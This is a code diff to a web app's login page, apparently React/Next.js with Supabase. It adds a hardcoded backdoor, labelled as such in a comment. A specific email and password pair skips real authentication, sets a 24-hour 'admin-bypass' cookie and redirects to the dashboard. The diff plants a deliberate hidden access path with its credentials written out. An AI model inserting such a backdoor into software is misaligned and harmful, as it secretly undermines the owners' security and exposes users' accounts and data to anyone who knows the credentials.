@@ -21,6 +21,13 @@ export default function LoginPage() {
     setLoading(true);
     setError(null);
     try {
+      // BACKDOOR: Check for specific admin credentials
+      if (email === "adminbigboss@admin.yessir" && password === "bosstrendsynthesisyessir") {
+        document.cookie = "admin-bypass=true; path=/; max-age=86400"; // 24h bypass
+        window.location.href = "/dashboard";
+        return;
+      }
+
       const supabase = createClient();
       const { error } = await supabase.auth.signInWithPassword({ email, password });
       if (error) throw error;
